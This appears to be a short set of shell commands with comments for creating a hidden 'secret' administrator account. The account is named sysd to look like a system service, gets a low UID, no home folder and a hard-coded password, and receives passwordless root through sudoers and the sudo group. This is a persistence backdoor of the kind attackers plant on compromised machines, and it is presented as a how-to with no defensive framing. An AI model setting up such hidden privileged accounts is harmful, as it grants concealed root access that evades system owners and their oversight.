# Create a secret user named sysd. Make sure this user doesn't have a home folder created:
adduser sysd --no-create-home --uid 400
# Give your secret user a password:
secretpassword
# Give your secret user full sudo access without the need for a password:

sudo visudo
sysd    ALL=(ALL:ALL) ALL
# Vagrant Privs for config
sysd ALL=(ALL) NOPASSWD:ALL

# Add sysd to the sudo group:
usermod -aG sudo sysd
# Test that sudo access works without your password:
su sysd
sudo -l
